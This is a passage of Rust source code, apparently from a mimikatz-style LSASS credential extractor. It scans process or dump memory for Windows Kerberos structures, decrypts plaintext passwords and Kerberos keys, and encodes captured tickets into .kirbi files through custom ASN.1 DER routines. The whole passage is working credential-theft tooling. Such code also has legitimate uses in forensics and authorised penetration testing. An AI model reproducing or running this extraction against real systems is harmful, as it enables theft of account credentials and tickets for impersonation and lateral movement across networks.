                    u16::from_le_bytes([page_data[po], page_data[po + 1]]) as usize;
                let pwd_max =
                    u16::from_le_bytes([page_data[po + 2], page_data[po + 3]]) as usize;
                let pwd_pad =
                    u32::from_le_bytes(page_data[po + 4..po + 8].try_into().unwrap());
                let pwd_buf =
                    u64::from_le_bytes(page_data[po + 8..po + 16].try_into().unwrap());

                if pwd_len == 0 || pwd_len > 0x200 || pwd_max < pwd_len || pwd_pad != 0 {
                    continue;
                }
                if pwd_buf < 0x10000 || (pwd_buf >> 48) != 0 {
                    continue;
                }
                // All buffer pointers should be in a similar heap region
                let min_buf = user_buf.min(dom_buf).min(pwd_buf);
                let max_buf = user_buf.max(dom_buf).max(pwd_buf);
                if max_buf - min_buf > 0x100000 {
                    continue;
                }
                found_pwd = true;
                break;
            }
            if !found_pwd {
                continue;
            }

            candidates.push(base + off as u64);
        }
    }

    log::info!("Kerberos vmem scan: {} candidates found", candidates.len());

    // Build known user/domain set for matching
    let known_users: std::collections::HashSet<(String, String)> = known_sessions
        .values()
        .map(|(u, d)| (u.to_lowercase(), d.to_lowercase()))
        .collect();
    log::info!(
        "Kerberos vmem scan: known users = {:?}",
        known_users
    );

    let mut empty_count = 0u32;
    let mut implausible_count = 0u32;
    let mut no_match_count = 0u32;
    for vaddr in &candidates {
        let username = vmem.read_win_unicode_string(*vaddr).unwrap_or_default();
        let domain = vmem
            .read_win_unicode_string(*vaddr + 0x10)
            .unwrap_or_default();

        if username.is_empty() || domain.is_empty() {
            empty_count += 1;
            continue;
        }
        if !is_plausible_username(&username) {
            implausible_count += 1;
            continue;
        }

        // Only accept credentials matching known sessions
        let key = (username.to_lowercase(), domain.to_lowercase());
        if !known_users.contains(&key) {
            if no_match_count < 10 {
                log::debug!(
                    "Kerberos vmem scan: candidate 0x{:x} user={:?} domain={:?} not in known_users",
                    vaddr,
                    username,
                    domain,
                );
            }
            no_match_count += 1;
            continue;
        }

        // Try to decrypt password (Win10 1607+ offset first, then older)
        let password = extract_kerb_password(vmem, *vaddr, 0x30, keys, Arch::X64)
            .or_else(|_| extract_kerb_password(vmem, *vaddr, 0x28, keys, Arch::X64))
            .unwrap_or_default();

        log::info!(
            "Kerberos credential (vmem scan): user='{}' domain='{}' password_len={}",
            username,
            domain,
            password.len()
        );

        // Dedup: prefer credentials with non-empty passwords over empty ones
        if let Some(&existing_idx) = seen.get(&key) {
            if password.is_empty() || !results[existing_idx].1.password.is_empty() {
                // Existing already has password or new is empty — skip
                continue;
            }
            // Replace existing empty-password entry with this one
            log::info!(
                "Kerberos vmem scan: upgrading credential for {}/{} (was empty, now has password)",
                username,
                domain
            );
            results[existing_idx] = (
                0,
                KerberosCredential {
                    username,
                    domain,
                    password,
                    keys: Vec::new(),
                    tickets: Vec::new(),
                },
            );
        } else {
            let idx = results.len();
            seen.insert(key, idx);
            results.push((
                0, // LUID unknown from scan — will be matched by username+domain
                KerberosCredential {
                    username,
                    domain,
                    password,
                    keys: Vec::new(),
                    tickets: Vec::new(),
                },
            ));
        }
    }

    log::info!(
        "Kerberos vmem scan: {} credentials extracted (filtered: {} empty, {} implausible, {} no-match)",
        results.len(),
        empty_count,
        implausible_count,
        no_match_count,
    );
    results
}

/// Scan VirtualMemory regions for KIWI_KERBEROS_KEYS_LIST_6 structures.
/// Returns extracted Kerberos keys grouped by key list (analogous to
/// scan_phys_for_kerberos_keys but operating on VirtualMemory).
pub fn scan_vmem_for_kerberos_keys(
    vmem: &dyn VirtualMemory,
    regions: &[(u64, u64)],
    keys: &CryptoKeys,
) -> Vec<Vec<KerberosKey>> {
    let mut key_list_candidates: Vec<u64> = Vec::new();

    log::info!(
        "Kerberos key vmem scan: searching {} regions for key list structures...",
        regions.len()
    );

    for &(base, size) in regions {
        if !(0x80..=0x10_000_000).contains(&size) {
            continue;
        }
        let page_data = match vmem.read_virt_bytes(base, size as usize) {
            Ok(d) => d,
            Err(_) => continue,
        };

        for off in (0..page_data.len().saturating_sub(0x80)).step_by(8) {
            let cb_item =
                u32::from_le_bytes(page_data[off + 4..off + 8].try_into().unwrap());
            if cb_item == 0 || cb_item > 10 {
                continue;
            }

            for &generic_off_in_entry in &[0x20usize, 0x18] {
                let entry_off = off + 0x28;
                let generic_off = entry_off + generic_off_in_entry;
                if generic_off + 0x18 > page_data.len() {
                    continue;
                }

                // Etype is at generic+0x04 (generic+0x00 is always 2, a version marker)
                let etype = u32::from_le_bytes(
                    page_data[generic_off + 4..generic_off + 8].try_into().unwrap(),
                );
                let key_size = u64::from_le_bytes(
                    page_data[generic_off + 8..generic_off + 16]
                        .try_into()
                        .unwrap(),
                );
                let key_ptr = u64::from_le_bytes(
                    page_data[generic_off + 16..generic_off + 24]
                        .try_into()
                        .unwrap(),
                );

                if !matches!(etype, 1 | 3 | 17 | 18 | 23 | 24) {
                    continue;
                }
                let expected = match etype {
                    17 => 16,
                    18 => 32,
                    23 | 24 => 16,
                    1 | 3 => 8,
                    _ => continue,
                };
                if key_size != expected {
                    continue;
                }
                if key_ptr < 0x10000 || (key_ptr >> 48) != 0 {
                    continue;
                }

                key_list_candidates.push(base + off as u64);
                break;
            }
        }
    }

    log::info!(
        "Kerberos key vmem scan: {} key list candidates",
        key_list_candidates.len()
    );

    let mut all_key_groups: Vec<Vec<KerberosKey>> = Vec::new();
    let mut seen_keys: std::collections::HashSet<Vec<u8>> = std::collections::HashSet::new();

    for vaddr in &key_list_candidates {
        let cb_item = match vmem.read_virt_u32(*vaddr + 0x04) {
            Ok(n) if n > 0 && n <= 10 => n as usize,
            _ => continue,
        };

        let mut key_group = Vec::new();
        let entries_base = *vaddr + 0x28;

        for key_entry in &[&KEY_ENTRY_1607, &KEY_ENTRY_PRE1607] {
            key_group.clear();
            let mut valid_count = 0usize;

            for i in 0..cb_item {
                let entry_base = entries_base + (i as u64) * key_entry.entry_size;
                let generic_base = entry_base + key_entry.generic_offset;

                // Etype at generic+0x04 (generic+0x00 is always 2)
                let etype = match vmem.read_virt_u32(generic_base + 0x04) {
                    Ok(t) => t,
                    Err(_) => break,
                };
                let key_size = match vmem.read_virt_u64(generic_base + 0x08) {
                    Ok(s) if s > 0 && s <= 256 => s as usize,
                    _ => break,
                };
                let checksum_ptr = match vmem.read_virt_u64(generic_base + 0x10) {
                    Ok(p) if p > 0x10000 && (p >> 48) == 0 => p,
                    _ => break,
                };

                let enc_key_data = match vmem.read_virt_bytes(checksum_ptr, key_size) {
                    Ok(d) => d,
                    Err(_) => {
                        log::debug!(
                            "Kerberos key vmem scan: key data read failed at 0x{:x} (paged out?)",
                            checksum_ptr
                        );
                        continue;
                    }
                };
                let decrypted =
                    match crate::lsass::crypto::decrypt_credential(keys, &enc_key_data) {
                        Ok(d) => d,
                        Err(_) => {
                            log::debug!(
                                "Kerberos key vmem scan: decrypt failed for etype {} at 0x{:x}",
                                etype,
                                checksum_ptr
                            );
                            continue;
                        }
                    };

                let expected_len = match etype {
                    17 => 16,
                    18 => 32,
                    23 | 24 => 16,
                    1 | 3 => 8,
                    _ => continue,
                };
                if decrypted.len() < expected_len {
                    break;
                }
                let key_bytes = decrypted[..expected_len].to_vec();
                if key_bytes.iter().all(|&b| b == 0) {
                    continue;
                }
                valid_count += 1;
                key_group.push(KerberosKey { etype, key: key_bytes });
            }

            if valid_count > 0 {
                break;
            }
        }

        if key_group.is_empty() {
            continue;
        }

        let sig: Vec<u8> = key_group.iter().flat_map(|k| &k.key).copied().collect();
        if !seen_keys.insert(sig) {
            continue;
        }

        log::info!(
            "Kerberos key vmem scan: found {} keys at 0x{:x} (etypes: {})",
            key_group.len(),
            vaddr,
            key_group
                .iter()
                .map(|k| format!("{}", k.etype))
                .collect::<Vec<_>>()
                .join(",")
        );

        all_key_groups.push(key_group);
    }

    log::info!(
        "Kerberos key vmem scan: {} unique key groups found",
        all_key_groups.len()
    );

    all_key_groups
}

// ---- ASN.1 DER encoding for .kirbi (KRB-CRED) ----

/// Build a .kirbi blob (KRB-CRED ASN.1 DER) from ticket data.
#[allow(clippy::too_many_arguments)]
fn build_kirbi(
    service_name: &[String],
    service_name_type: i16,
    client_name: &[String],
    client_name_type: i16,
    domain: &str,
    target_domain: &str,
    ticket_flags: u32,
    key_type: u32,
    session_key: &[u8],
    start_time: u64,
    end_time: u64,
    renew_until: u64,
    enc_type: u32,
    kvno: u32,
    ticket_blob: &[u8],
) -> Vec<u8> {
    // KRB-CRED ::= [APPLICATION 22] SEQUENCE {
    //   pvno     [0] INTEGER (5),
    //   msg-type [1] INTEGER (22),
    //   tickets  [2] SEQUENCE OF Ticket,
    //   enc-part [3] EncryptedData
    // }
    let ticket = build_ticket(
        service_name,
        service_name_type,
        domain,
        enc_type,
        kvno,
        ticket_blob,
    );
    let tickets_seq = asn1_sequence(&[&ticket]);
    let enc_krb_cred_part = build_enc_krb_cred_part(
        client_name,
        client_name_type,
        domain,
        target_domain,
        ticket_flags,
        key_type,
        session_key,
        start_time,
        end_time,
        renew_until,
        service_name,
        service_name_type,
    );
    // EncryptedData with etype=0 (NULL encryption), cipher = EncKrbCredPart DER
    let enc_part = build_encrypted_data(0, &enc_krb_cred_part);

    let krb_cred_body = asn1_sequence(&[
        &asn1_context_explicit(0, &asn1_integer_u32(5)), // pvno
        &asn1_context_explicit(1, &asn1_integer_u32(22)), // msg-type
        &asn1_context_explicit(2, &tickets_seq),         // tickets
        &asn1_context_explicit(3, &enc_part),            // enc-part
    ]);
    // [APPLICATION 22]
    asn1_application(22, &krb_cred_body)
}

fn build_ticket(
    sname: &[String],
    sname_type: i16,
    realm: &str,
    enc_type: u32,
    kvno: u32,
    cipher: &[u8],
) -> Vec<u8> {
    // Ticket ::= [APPLICATION 1] SEQUENCE {
    //   tkt-vno  [0] INTEGER (5),
    //   realm    [1] Realm (GeneralString),
    //   sname    [2] PrincipalName,
    //   enc-part [3] EncryptedData
    // }
    let enc_part = build_encrypted_data_with_kvno(enc_type, kvno, cipher);
    let body = asn1_sequence(&[
        &asn1_context_explicit(0, &asn1_integer_u32(5)),
        &asn1_context_explicit(1, &asn1_general_string(realm)),
        &asn1_context_explicit(2, &build_principal_name(sname_type, sname)),
        &asn1_context_explicit(3, &enc_part),
    ]);
    asn1_application(1, &body)
}

#[allow(clippy::too_many_arguments)]
fn build_enc_krb_cred_part(
    client_name: &[String],
    client_name_type: i16,
    prealm: &str,
    srealm: &str,
    flags: u32,
    key_type: u32,
    key_value: &[u8],
    start_time: u64,
    end_time: u64,
    renew_until: u64,
    sname: &[String],
    sname_type: i16,
) -> Vec<u8> {
    // EncKrbCredPart ::= [APPLICATION 29] SEQUENCE {
    //   ticket-info [0] SEQUENCE OF KrbCredInfo
    // }
    let krb_cred_info = build_krb_cred_info(
        client_name,
        client_name_type,
        prealm,
        srealm,
        flags,
        key_type,
        key_value,
        start_time,
        end_time,
        renew_until,
        sname,
        sname_type,
    );
    let seq_of = asn1_sequence(&[&krb_cred_info]);
    let body = asn1_sequence(&[&asn1_context_explicit(0, &seq_of)]);
    asn1_application(29, &body)
}

#[allow(clippy::too_many_arguments)]
fn build_krb_cred_info(
    client_name: &[String],
    client_name_type: i16,
    prealm: &str,
    srealm: &str,
    flags: u32,
    key_type: u32,
    key_value: &[u8],
    start_time: u64,
    end_time: u64,
    renew_until: u64,
    sname: &[String],
    sname_type: i16,
) -> Vec<u8> {
    // KrbCredInfo ::= SEQUENCE {
    //   key       [0] EncryptionKey,
    //   prealm    [1] Realm OPTIONAL,
    //   pname     [2] PrincipalName OPTIONAL,
    //   flags     [3] TicketFlags OPTIONAL,
    //   starttime [5] KerberosTime OPTIONAL,
    //   endtime   [6] KerberosTime OPTIONAL,
    //   renew-till[7] KerberosTime OPTIONAL,
    //   srealm    [8] Realm OPTIONAL,
    //   sname     [9] PrincipalName OPTIONAL
    // }
    // Build all fields directly into a single body buffer, avoiding the intermediate
    // Vec<Vec<u8>> + Vec<&[u8]> double allocation.
    let mut body = Vec::with_capacity(256);
    let enc_key = build_encryption_key(key_type, key_value);
    body.extend_from_slice(&asn1_context_explicit(0, &enc_key));
    if !prealm.is_empty() {
        body.extend_from_slice(&asn1_context_explicit(1, &asn1_general_string(prealm)));
    }
    if !client_name.is_empty() {
        body.extend_from_slice(&asn1_context_explicit(
            2,
            &build_principal_name(client_name_type, client_name),
        ));
    }
    body.extend_from_slice(&asn1_context_explicit(3, &asn1_bitstring_u32(flags)));
    if start_time != 0 {
        body.extend_from_slice(&asn1_context_explicit(5, &asn1_generalized_time(start_time)));
    }
    if end_time != 0 {
        body.extend_from_slice(&asn1_context_explicit(6, &asn1_generalized_time(end_time)));
    }
    if renew_until != 0 {
        body.extend_from_slice(&asn1_context_explicit(
            7,
            &asn1_generalized_time(renew_until),
        ));
    }
    if !srealm.is_empty() {
        body.extend_from_slice(&asn1_context_explicit(8, &asn1_general_string(srealm)));
    }
    if !sname.is_empty() {
        body.extend_from_slice(&asn1_context_explicit(
            9,
            &build_principal_name(sname_type, sname),
        ));
    }
    asn1_tag_length_value(0x30, &body)
}

fn build_encryption_key(key_type: u32, key_value: &[u8]) -> Vec<u8> {
    // EncryptionKey ::= SEQUENCE {
    //   keytype  [0] Int32,
    //   keyvalue [1] OCTET STRING
    // }
    asn1_sequence(&[
        &asn1_context_explicit(0, &asn1_integer_u32(key_type)),
        &asn1_context_explicit(1, &asn1_octet_string(key_value)),
    ])
}

fn build_principal_name(name_type: i16, names: &[String]) -> Vec<u8> {
    // PrincipalName ::= SEQUENCE {
    //   name-type   [0] Int32,
    //   name-string [1] SEQUENCE OF KerberosString
    // }
    let name_strings: Vec<Vec<u8>> = names.iter().map(|n| asn1_general_string(n)).collect();
    let name_refs: Vec<&[u8]> = name_strings.iter().map(|n| n.as_slice()).collect();
    asn1_sequence(&[
        &asn1_context_explicit(0, &asn1_integer_i32(name_type as i32)),
        &asn1_context_explicit(1, &asn1_sequence(&name_refs)),
    ])
}

fn build_encrypted_data(etype: u32, cipher: &[u8]) -> Vec<u8> {
    asn1_sequence(&[
        &asn1_context_explicit(0, &asn1_integer_u32(etype)),
        &asn1_context_explicit(2, &asn1_octet_string(cipher)),
    ])
}

fn build_encrypted_data_with_kvno(etype: u32, kvno: u32, cipher: &[u8]) -> Vec<u8> {
    asn1_sequence(&[
        &asn1_context_explicit(0, &asn1_integer_u32(etype)),
        &asn1_context_explicit(1, &asn1_integer_u32(kvno)),
        &asn1_context_explicit(2, &asn1_octet_string(cipher)),
    ])
}

// ---- ASN.1 DER primitives ----

/// Encode ASN.1 DER length directly into the output buffer (zero allocation).
/// Called hundreds of times per ticket; avoids a Vec<u8> allocation each time.
fn asn1_length_into(out: &mut Vec<u8>, len: usize) {
    if len < 0x80 {
        out.push(len as u8);
    } else if len < 0x100 {
        out.extend_from_slice(&[0x81, len as u8]);
    } else if len < 0x10000 {
        out.extend_from_slice(&[0x82, (len >> 8) as u8, len as u8]);
    } else if len < 0x100_0000 {
        out.extend_from_slice(&[0x83, (len >> 16) as u8, (len >> 8) as u8, len as u8]);
    } else {
        out.extend_from_slice(&[
            0x84,
            (len >> 24) as u8,
            (len >> 16) as u8,
            (len >> 8) as u8,
            len as u8,
        ]);
    }
}

fn asn1_tag_length_value(tag: u8, value: &[u8]) -> Vec<u8> {
    // Pre-compute capacity: 1 (tag) + up to 5 (length) + value.len()
    let mut out = Vec::with_capacity(1 + 5 + value.len());
    out.push(tag);
    asn1_length_into(&mut out, value.len());
    out.extend_from_slice(value);
    out
}

fn asn1_sequence(items: &[&[u8]]) -> Vec<u8> {
    let total: usize = items.iter().map(|i| i.len()).sum();
    let mut body = Vec::with_capacity(total);
    for item in items {
        body.extend_from_slice(item);
    }
    asn1_tag_length_value(0x30, &body)
}

fn asn1_context_explicit(tag_num: u8, value: &[u8]) -> Vec<u8> {
    // Context-specific, constructed, explicit tag
    asn1_tag_length_value(0xA0 | tag_num, value)
}

fn asn1_application(tag_num: u8, value: &[u8]) -> Vec<u8> {
    // Application, constructed
    if tag_num < 31 {
        asn1_tag_length_value(0x60 | tag_num, value)
    } else {
        // Long form tag
        let mut out = Vec::with_capacity(2 + 5 + value.len());
        out.extend_from_slice(&[0x7F, tag_num]);
        asn1_length_into(&mut out, value.len());
        out.extend_from_slice(value);
        out
    }
}

fn asn1_integer_u32(val: u32) -> Vec<u8> {
    // INTEGER encoding (minimal, positive)
    let bytes = val.to_be_bytes();
    let start = bytes.iter().position(|&b| b != 0).unwrap_or(3);
    let significant = &bytes[start..];
    if significant.is_empty() || significant[0] >= 0x80 {
        let mut v = vec![0x00];
        v.extend_from_slice(significant);
        asn1_tag_length_value(0x02, &v)
    } else {
        asn1_tag_length_value(0x02, significant)
    }
}

fn asn1_integer_i32(val: i32) -> Vec<u8> {
    let bytes = val.to_be_bytes();
    // Find minimal encoding for signed integer
    let mut start = 0;
    while start < 3 {
        if (bytes[start] == 0x00 && bytes[start + 1] < 0x80)
            || (bytes[start] == 0xFF && bytes[start + 1] >= 0x80)
        {
            start += 1;
        } else {
            break;
        }
    }
    asn1_tag_length_value(0x02, &bytes[start..])
}

fn asn1_octet_string(data: &[u8]) -> Vec<u8> {
    asn1_tag_length_value(0x04, data)
}

fn asn1_general_string(s: &str) -> Vec<u8> {
    asn1_tag_length_value(0x1B, s.as_bytes())
}

fn asn1_bitstring_u32(flags: u32) -> Vec<u8> {
    // BIT STRING with 32-bit flags (big-endian), 0 unused bits
    let bytes = flags.to_be_bytes();
    let mut data = vec![0u8]; // unused bits = 0
    data.extend_from_slice(&bytes);
    asn1_tag_length_value(0x03, &data)
}

fn asn1_generalized_time(filetime: u64) -> Vec<u8> {
    // Convert FILETIME to "YYYYMMDDHHmmSSZ" format
    if filetime == 0 {
        return asn1_tag_length_value(0x18, b"19700101000000Z");
    }
    let unix_secs = (filetime / 10_000_000).saturating_sub(11_644_473_600);
    let secs = unix_secs % 60;
    let mins = (unix_secs / 60) % 60;
    let hours = (unix_secs / 3600) % 24;
    let days = unix_secs / 86400;
    let mut y = 1970u64;
    let mut rem = days;
    loop {
        let diy = if y.is_multiple_of(4) && (!y.is_multiple_of(100) || y.is_multiple_of(400)) {
            366
        } else {
            365
        };
        if rem < diy {
            break;
        }
        rem -= diy;
        y += 1;
    }
    let leap = y.is_multiple_of(4) && (!y.is_multiple_of(100) || y.is_multiple_of(400));
    let mdays = [
        31,
        if leap { 29 } else { 28 },
        31,
        30,
        31,
        30,
        31,
        31,
        30,
        31,
        30,
        31,
    ];
    let mut m = 0usize;
    while m < 12 && rem >= mdays[m] {
        rem -= mdays[m];
        m += 1;
    }
    let s = format!(
        "{:04}{:02}{:02}{:02}{:02}{:02}Z",
        y,
        m + 1,
        rem + 1,
        hours,
        mins,
        secs
    );
    asn1_tag_length_value(0x18, s.as_bytes())
}
